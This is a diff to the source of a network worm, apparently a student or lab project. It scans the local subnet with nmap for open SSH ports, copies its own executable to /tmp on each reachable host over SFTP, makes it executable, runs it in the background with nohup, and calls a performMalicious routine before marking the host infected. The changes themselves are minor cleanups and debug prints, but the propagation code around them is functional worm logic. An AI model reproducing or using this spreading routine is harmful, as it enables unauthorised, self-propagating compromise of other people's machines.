@@ -256,6 +256,13 @@ Iface getMyActiveIP() {
 vector<string> getHostsOnTheSameNetwork(const Iface host) {
 
     string nmapFile = "/tmp/nmap.txt";
+    char NMAP[] = "/usr/bin/nmap";
+    struct stat fileBuff;
+
+    if ( stat(NMAP, &fileBuff) != 0) {
+        perror("getHostsOnTheSameNetwork: cannot find /usr/bin/nmap\n");
+        exit(-1);
+    }
 
     // We will fork a child and use it to run nmap
     // Expected that the nmap program is available on the system
@@ -275,7 +282,7 @@ vector<string> getHostsOnTheSameNetwork(const Iface host) {
         // Run nmap program against the CIDR string for:
         // port 22 with open status
         // output in greppable format in a file called /tmp/nmap.txt
-        if (execlp("/usr/bin/nmap", "nmap", host.cidr.c_str(), "-p 22", "--open", "-oG", nmapFile.c_str(), NULL) < 0) {
+        if (execlp(NMAP, "nmap", host.cidr.c_str(), "-p 22", "--open", "-oG", nmapFile.c_str(), NULL) < 0) {
             perror("getHostsOnTheSameNetwork: execlp failed child");
             exit(-1);
         };
@@ -515,6 +522,9 @@ int spreadFile(ssh_session &sshClient, char *source, char *target) {
     // We want to Open the file to Write Only, and Truncate if already exist
     int access_type = O_WRONLY | O_CREAT | O_TRUNC;
 
+    printf("Source file: %s\n", source);
+    printf("Target file: %s\n", target);
+
     // Create a sftp session
     sftp_session sftp = sftp_new(sshClient);
 
@@ -614,6 +624,9 @@ int remoteExecute(ssh_session &sshClient, char *cmd) {
     }
 
     // if we get here it means the command execute successfully
+    // We will close the channel and free before return
+    ssh_channel_close(ssh);
+    ssh_channel_free(ssh);
     return 0;
 
 }
@@ -627,9 +640,9 @@ int remoteExecute(ssh_session &sshClient, char *cmd) {
  ******************************************************************************/
 int spreadAndExecute(ssh_session &sshClient, const string fromHost) {
     // Determine the worm location and its base name
-    char sourceName[PATH_MAX];
-    char destName[PATH_MAX];
-    char command[1024];
+    char sourceName[PATH_MAX] = {0};
+    char destName[PATH_MAX] = {0};
+    char command[1024] = {0};
 
     // Determine the full path of the worm file
     if (readlink("/proc/self/exe", sourceName, PATH_MAX) == -1) {
@@ -638,7 +651,7 @@ int spreadAndExecute(ssh_session &sshClient, const string fromHost) {
     }
 
     // Build out the worm destination path and name
-    sprintf(destName, "%s%s", "/tmp/", basename(sourceName));
+    sprintf(destName, "/tmp/%s", basename(sourceName));
 
     // Spread the file
     if (spreadFile(sshClient, sourceName, destName) != 0) {
@@ -647,14 +660,14 @@ int spreadAndExecute(ssh_session &sshClient, const string fromHost) {
     }
 
     // We want to allow read/execute to file for all chmod a+rx
-    sprintf(command, "%s%s", "chmod a+rx ", destName);
+    sprintf(command, "chmod a+rx %s", destName);
     if (remoteExecute(sshClient, command) != 0) {
         perror("spreadAndExecute: failed chmod the worm\n");
         return -1;
     }
 
     // Now we tell it to execute
-    sprintf(command, "%s %s %s %s", "nohup", destName, fromHost.c_str(), " >/tmp/nohup.out 2>&1 &");
+    sprintf(command, "nohup %s %s >/tmp/nohup.out 2>&1 &", destName, fromHost.c_str());
     if (remoteExecute(sshClient, command) != 0) {
         perror("spreadAndExecute: failed execute the worm\n");
         return -1;
@@ -686,6 +699,7 @@ int main (int argc, const char **argv) {
     {
         // If the Local System has not been mark as master, mark it
         if (! isLocalSystemInfected() ) {
+            printf("Marking system as hacker system\n");
             // Mark the system as master
             markSystemAsMaster();
         }
@@ -698,10 +712,10 @@ int main (int argc, const char **argv) {
             exit(0);
         } else {
             string fromHost = argv[1];
-
+            printf("We won't be doing anything for this one\n");
             // Perform malicious
             performMalicious();
-
+            printf("Marked system as infected\n");
             // Mark the system
             markSystemAsInfected(fromHost);
         }
